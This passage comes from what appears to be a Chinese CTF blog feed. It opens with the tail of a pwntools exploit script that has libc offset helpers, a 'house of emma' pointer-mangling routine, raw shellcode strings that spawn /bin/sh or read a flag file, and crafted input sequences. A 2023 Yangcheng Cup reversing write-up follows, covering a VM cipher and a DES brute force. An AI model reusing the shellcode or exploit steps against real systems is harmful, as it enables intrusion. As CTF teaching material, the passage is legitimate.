= libc.sym.__malloc_hook</span><br><span class="line">    <span class="hljs-keyword">if</span> ofs_realloc_hook <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> \</span><br><span class="line">       <span class="hljs-keyword">or</span> ofs_malloc_hook <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> \</span><br><span class="line">       <span class="hljs-keyword">or</span> ofs_stdin <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt; ofs_malloc_hook - ofs_stdin &lt; <span class="hljs-number">0x1000</span>:</span><br><span class="line">        <span class="hljs-comment"># libc-2.33 or older</span></span><br><span class="line">        <span class="hljs-keyword">if</span> context.bits == <span class="hljs-number">32</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ofs_malloc_hook + <span class="hljs-number">0x18</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ofs_malloc_hook + (ofs_malloc_hook - ofs_realloc_hook)*<span class="hljs-number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-comment"># libc-2.34 removed hooks</span></span><br><span class="line">        ofs_tzname = libc.sym.tzname</span><br><span class="line">        <span class="hljs-keyword">if</span> ofs_tzname <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br><span class="line">        <span class="hljs-keyword">if</span> context.bits == <span class="hljs-number">32</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ofs_tzname - <span class="hljs-number">0x460</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ofs_tzname - <span class="hljs-number">0x8a0</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ROL</span>(<span class="hljs-params">content, key</span>):</span></span><br><span class="line">    <span class="hljs-comment"># house of emma</span></span><br><span class="line">    <span class="hljs-comment"># ROL(gadget_addr ^ fake_pointer_guard, 0x11)</span></span><br><span class="line">    tmp = <span class="hljs-built_in">bin</span>(content)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">64</span>, <span class="hljs-string">'0'</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(tmp[key:] + tmp[:key], <span class="hljs-number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># dbgaddr(0x14d2,PIE=True)</span></span><br><span class="line"><span class="hljs-comment"># dbg("main")</span></span><br><span class="line"><span class="hljs-comment"># gdb.attach(p,"b *run_program+34 if $rax==0x66")</span></span><br><span class="line"></span><br><span class="line">s = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>: p.send(<span class="hljs-built_in">str</span>)</span><br><span class="line">sl = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>: p.sendline(<span class="hljs-built_in">str</span>)</span><br><span class="line">sa = <span class="hljs-keyword">lambda</span> delims, <span class="hljs-built_in">str</span>: p.sendafter(delims, <span class="hljs-built_in">str</span>)</span><br><span class="line">sla = <span class="hljs-keyword">lambda</span> delims, <span class="hljs-built_in">str</span>: p.sendlineafter(delims, <span class="hljs-built_in">str</span>)</span><br><span class="line">r = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>: p.recv(numb)</span><br><span class="line">rl = <span class="hljs-keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>: p.recvuntil(delims, drop)</span><br><span class="line">uu32 = <span class="hljs-keyword">lambda</span> data: u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b'\x00'</span>))</span><br><span class="line">uu64 = <span class="hljs-keyword">lambda</span> data: u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\x00'</span>))</span><br><span class="line">li = <span class="hljs-keyword">lambda</span> <span class="hljs-built_in">str</span>, data: log.success(<span class="hljs-built_in">str</span> + <span class="hljs-string">'========&gt;'</span> + <span class="hljs-built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># https://www.exploit-db.com/shellcodes</span></span><br><span class="line">execve_bin_sh = <span class="hljs-string">b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line">execveat_bin_sh = <span class="hljs-string">b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"</span></span><br><span class="line">cat_flag = <span class="hljs-string">b"\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x67\x6d\x60\x66\x01\x01\x01\x48\x31\x04\x24\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"</span></span><br><span class="line">ls_current_dir = <span class="hljs-string">b"\x68\x2f\x2e\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\x89\xe7\x31\xd2\xbe\x01\x01\x02\x01\x81\xf6\x01\x01\x03\x01\x6a\x02\x58\x0f\x05\x48\x89\xc7\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x4e\x58\x0f\x05\x6a\x01\x5f\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x01\x58\x0f\x05"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#%%</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x56</span>):</span><br><span class="line">    sl(<span class="hljs-string">b"%x66"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">id</span>=<span class="hljs-number">0x69</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">idx</span>():</span></span><br><span class="line">    <span class="hljs-keyword">global</span> <span class="hljs-built_in">id</span></span><br><span class="line">    tmp_id=<span class="hljs-built_in">id</span></span><br><span class="line">    <span class="hljs-built_in">id</span>+=<span class="hljs-number">3</span></span><br><span class="line">    <span class="hljs-keyword">return</span> tmp_id</span><br><span class="line"></span><br><span class="line">sl(<span class="hljs-string">f"%x0\n%x0\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%x1\n%x1\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%xfffffffffffffffe\n%x1\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%x1\n%x0\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%x0\n%x53d09\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%x0\n%x0\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="hljs-string">f"%xfffffffffffffffe\n%x0\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%x0\n%x53d02\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%x53cfd\n%x53cf3\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%x0\n%x0\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%xfffffffffffffffe\n%x0\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%x0\n%x53cee\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="hljs-string">f"%x0\n%x0\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%x102e6\n%x0\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="hljs-string">f"%xda\n%xda\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%xfffffffffffffffe\n%xda\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%x0\n%xda\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="hljs-string">f"%xeb\n%xeb\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%xfffffffffffffffe\n%xeb\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%x0\n%xeb\n%<span class="hljs-subst">{idx()}</span>"</span>)</span><br><span class="line">sl(<span class="hljs-string">f"%x0\n%x0\n%xfffffffffffffffe"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>((<span class="hljs-number">0x600</span>-<span class="hljs-number">0x538</span>)//<span class="hljs-number">8</span>):</span><br><span class="line">    sl(<span class="hljs-string">b"%x66"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> IO_FILE <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file=IO_FILE_plus()</span><br><span class="line">file._IO_write_base=<span class="hljs-number">0</span></span><br><span class="line">file._IO_buf_base=<span class="hljs-number">0</span></span><br><span class="line">payload=<span class="hljs-built_in">bytes</span>(file)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(payload)//<span class="hljs-number">8</span>+<span class="hljs-number">1</span>):</span><br><span class="line">    sl(<span class="hljs-string">f"%0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x413</span>-<span class="hljs-number">0x65</span>-<span class="hljs-number">17</span>*<span class="hljs-number">3</span>-(<span class="hljs-number">0x600</span>-<span class="hljs-number">0x538</span>)//<span class="hljs-number">8</span>-<span class="hljs-built_in">len</span>(payload)//<span class="hljs-number">8</span>-<span class="hljs-number">1</span>):</span><br><span class="line">    sl(<span class="hljs-string">b"%x66"</span>)</span><br><span class="line">sl(<span class="hljs-string">""</span>)</span><br><span class="line"><span class="hljs-comment">#%%</span></span><br><span class="line">sl(<span class="hljs-string">"%xfffffffffffffac0"</span>)</span><br><span class="line">sl(<span class="hljs-string">"%x29d3a0"</span>)</span><br><span class="line"><span class="hljs-comment"># sl("%xc044b567")</span></span><br><span class="line">sl(<span class="hljs-string">"%xffd5df8c9a4a0867"</span>) <span class="hljs-comment"># b"  cat *"</span></span><br><span class="line">sl(<span class="hljs-string">"%xfffffffffff7efc0"</span>)</span><br><span class="line">sl(<span class="hljs-string">"%x53620"</span>)</span><br><span class="line"><span class="hljs-comment">#%%</span></span><br><span class="line"><span class="hljs-comment"># b *run_program+34 if $rax==0x66</span></span><br><span class="line"><span class="hljs-comment"># ignore 1 0x411</span></span><br><span class="line"><span class="hljs-comment"># b *run_program+72</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023-羊城杯-wp</title>
      <link href="/2023/09/03/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-wp/"/>
      <url>/2023/09/03/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>2023 羊城杯 wp</p><span id="more"></span><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="vm-wo"><a href="#vm-wo" class="headerlink" title="vm_wo"></a>vm_wo</h2><p>字节码很少，分析一下可以得到整个加密执行的逻辑。</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"defs.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_ops</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  _QWORD v5[<span class="hljs-number">2</span>] = {<span class="hljs-number">0</span>}; <span class="hljs-comment">// [xsp+8h] [xbp-98h] BYREF</span></span><br><span class="line">  _QWORD v6[<span class="hljs-number">2</span>] = {<span class="hljs-number">0</span>}; <span class="hljs-comment">// [xsp+18h] [xbp-88h] BYREF</span></span><br><span class="line">  _QWORD v7[<span class="hljs-number">2</span>] = {<span class="hljs-number">0</span>}; <span class="hljs-comment">// [xsp+28h] [xbp-78h] BYREF</span></span><br><span class="line">  _QWORD v8[<span class="hljs-number">2</span>] = {<span class="hljs-number">0</span>};</span><br><span class="line">  v8[<span class="hljs-number">0</span>] = <span class="hljs-number">0x20D01011903001A</span>LL;</span><br><span class="line">  *(_QWORD *)((<span class="hljs-keyword">char</span> *)v8 + <span class="hljs-number">7</span>) = <span class="hljs-number">0x300010201180702</span>LL;</span><br><span class="line">  <span class="hljs-built_in">BYTE2</span>(v8[<span class="hljs-number">0</span>]) = <span class="hljs-number">0x66</span>;</span><br><span class="line">  _BYTE *tmp = (_BYTE *)v8;</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%02x "</span>, tmp[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);</span><br><span class="line">  v7[<span class="hljs-number">0</span>] = <span class="hljs-number">0x20D02011903001A</span>LL;</span><br><span class="line">  *(_QWORD *)((<span class="hljs-keyword">char</span> *)v7 + <span class="hljs-number">7</span>) = <span class="hljs-number">0x400010201180602</span>LL;</span><br><span class="line">  <span class="hljs-built_in">BYTE2</span>(v7[<span class="hljs-number">0</span>]) = <span class="hljs-number">0x66</span>;</span><br><span class="line">  tmp = (_BYTE *)v7;</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%02x "</span>, tmp[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);</span><br><span class="line">  v6[<span class="hljs-number">0</span>] = <span class="hljs-number">0x20D03011903001A</span>LL;</span><br><span class="line">  *(_QWORD *)((<span class="hljs-keyword">char</span> *)v6 + <span class="hljs-number">7</span>) = <span class="hljs-number">0x500010201180502</span>LL;</span><br><span class="line">  <span class="hljs-built_in">BYTE2</span>(v6[<span class="hljs-number">0</span>]) = <span class="hljs-number">0x66</span>;</span><br><span class="line">  tmp = (_BYTE *)v6;</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%02x "</span>, tmp[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);</span><br><span class="line">  v5[<span class="hljs-number">0</span>] = <span class="hljs-number">0x20D04011903001A</span>LL;</span><br><span class="line">  *(_QWORD *)((<span class="hljs-keyword">char</span> *)v5 + <span class="hljs-number">7</span>) = <span class="hljs-number">0x600010201180402</span>LL;</span><br><span class="line">  <span class="hljs-built_in">BYTE2</span>(v5[<span class="hljs-number">0</span>]) = <span class="hljs-number">0x66</span>;</span><br><span class="line">  tmp = (_BYTE *)v5;</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%02x "</span>, tmp[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">vm[op1] = op2</span></span><br><span class="line"><span class="hljs-comment">vm[op1]=vm[0]&gt;&gt;op2</span></span><br><span class="line"><span class="hljs-comment">vm[op1]=vm[0]&lt;&lt;op2</span></span><br><span class="line"><span class="hljs-comment">vm[0]=vm[1]|vm[2]</span></span><br><span class="line"><span class="hljs-comment">vm[op1]^=vm[op2]</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">ops:</span></span><br><span class="line"><span class="hljs-comment">vm[0]=a1</span></span><br><span class="line"><span class="hljs-comment">vm[1]=vm[0]&gt;&gt;1</span></span><br><span class="line"><span class="hljs-comment">vm[2]=vm[0]&lt;&lt;7</span></span><br><span class="line"><span class="hljs-comment">vm[0]=vm[1]|vm[2]</span></span><br><span class="line"><span class="hljs-comment">vm[0]^=vm[3]</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">vm[1]=vm[0]&gt;&gt;2</span></span><br><span class="line"><span class="hljs-comment">vm[2]=vm[0]&lt;&lt;6</span></span><br><span class="line"><span class="hljs-comment">vm[0]=vm[1]|vm[2]</span></span><br><span class="line"><span class="hljs-comment">vm[0]^=vm[4]</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">vm[1]=vm[0]&gt;&gt;3</span></span><br><span class="line"><span class="hljs-comment">vm[2]=vm[0]&lt;&lt;5</span></span><br><span class="line"><span class="hljs-comment">vm[0]=vm[1]|vm[2]</span></span><br><span class="line"><span class="hljs-comment">vm[0]^=vm[5]</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">vm[1]=vm[0]&gt;&gt;4</span></span><br><span class="line"><span class="hljs-comment">vm[2]=vm[0]&lt;&lt;4</span></span><br><span class="line"><span class="hljs-comment">vm[0]=vm[1]|vm[2]</span></span><br><span class="line"><span class="hljs-comment">vm[0]^=vm[6]</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">vm[0]=(vm[0]&gt;&gt;5)|(vm[0]&lt;&lt;3)</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br></pre></td></tr></tbody></table></figure><p>根据结果反过来求解即可。</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> res[<span class="hljs-number">30</span>] = {</span><br><span class="line">    <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xB3</span>, </span><br><span class="line">    <span class="hljs-number">0x85</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x00</span></span><br><span class="line">};</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> ivs[<span class="hljs-number">4</span>]={<span class="hljs-number">0xEF</span>,<span class="hljs-number">0xBE</span>,<span class="hljs-number">0xED</span>,<span class="hljs-number">0xBE</span>};</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> vm=<span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">29</span>;i++)</span><br><span class="line">    {</span><br><span class="line">        vm=res[i];</span><br><span class="line">        vm=(vm&lt;&lt;<span class="hljs-number">5</span>)|(vm&gt;&gt;<span class="hljs-number">3</span>);</span><br><span class="line">        </span><br><span class="line">        vm^=ivs[<span class="hljs-number">3</span>];</span><br><span class="line">        vm=(vm&lt;&lt;<span class="hljs-number">4</span>)|(vm&gt;&gt;<span class="hljs-number">4</span>);</span><br><span class="line"></span><br><span class="line">        vm^=ivs[<span class="hljs-number">2</span>];</span><br><span class="line">        vm=(vm&lt;&lt;<span class="hljs-number">3</span>)|(vm&gt;&gt;<span class="hljs-number">5</span>);</span><br><span class="line"></span><br><span class="line">        vm^=ivs[<span class="hljs-number">1</span>];</span><br><span class="line">        vm=(vm&lt;&lt;<span class="hljs-number">2</span>)|(vm&gt;&gt;<span class="hljs-number">6</span>);    </span><br><span class="line"></span><br><span class="line">        vm^=ivs[<span class="hljs-number">0</span>];</span><br><span class="line">        vm=(vm&lt;&lt;<span class="hljs-number">1</span>)|(vm&gt;&gt;<span class="hljs-number">7</span>);  </span><br><span class="line"></span><br><span class="line">        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>,vm);  </span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="Ez加密器"><a href="#Ez加密器" class="headerlink" title="Ez加密器"></a>Ez加密器</h2><p>首先输入verification code和flag，进行第一步的判断</p><p><img src="/2023/09/03/2023-%E7%BE%8A%E5%9F%8E%E6%9D%AF-wp/1.jpeg"></p><p>这一部分判断verification code的长度为6，只包含数字，flag长度为40，格式为<code>DASCTF{*}</code>。</p><p>之后对verification code做一个换表的base64，并用结果作为DES的密钥加密flag，转换成字符并和硬编码的结果进行对比。</p><p>由于不知道verification code，所以需要爆破，但是只有6位数字，难度不大，用pwntools的mbruteforce多线程爆破基本秒出结果。</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> pwnlib.util.iters <span class="hljs-keyword">import</span> mbruteforce</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hash</span>(<span class="hljs-params">x</span>):</span></span><br><span class="line">    str1 = x.encode()</span><br><span class="line"></span><br><span class="line">    string1 = <span class="hljs-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/"</span></span><br><span class="line">    string2 = <span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line"></span><br><span class="line">    password=base64.b64encode(str1).decode().translate(<span class="hljs-built_in">str</span>.maketrans(string2,string1)).encode()</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES</span><br><span class="line">    <span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line">    aes = DES.new(password,DES.MODE_ECB) <span class="hljs-comment">#创建一个aes对象</span></span><br><span class="line"></span><br><span class="line">    en_text = a2b_hex(<span class="hljs-string">"0723105D5C12217DCDC3601F5ECB54DA9CCEC2279F1684A13A0D716D17217F4C9EA85FF1A42795731CA3C55D3A4D7BEA"</span>)</span><br><span class="line">    den_text = aes.decrypt(en_text)</span><br><span class="line">    <span class="hljs-comment"># print(den_text)</span></span><br><span class="line">    <span class="hljs-keyword">return</span> den_text.startswith(<span class="hljs-string">b"DASCTF{"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># mbruteforce(hash, string.digits, 6, method='fixed')</span></span><br><span class="line"></span><br><span class="line">str1=<span class="hljs-string">b"151490"</span></span><br><span class="line">string1 = <span class="hljs-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/"</span></span><br><span class="line">string2 = <span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line"></span><br><span class="line">password=base64.b64encode(str1).decode().translate(<span class="hljs-built_in">str</span>.maketrans(string2,string1)).encode()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES</span><br><span class="line"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line">aes = DES.new(password,DES.MODE_ECB) <span class="hljs-comment">#创建一个aes对象</span></span><br><span class="line"></span><br><span class="line">en_text = a2b_hex(<span class="hljs-string">"0723105D5C12217DCDC3601F5ECB54DA9CCEC2279F1684A13A0D716D17217F4C9EA85FF1A42795731CA3C55D3A4D7BEA"</span>)</span><br><span class="line">den_text = aes.decrypt(en_text)</span><br><span class="line"><span 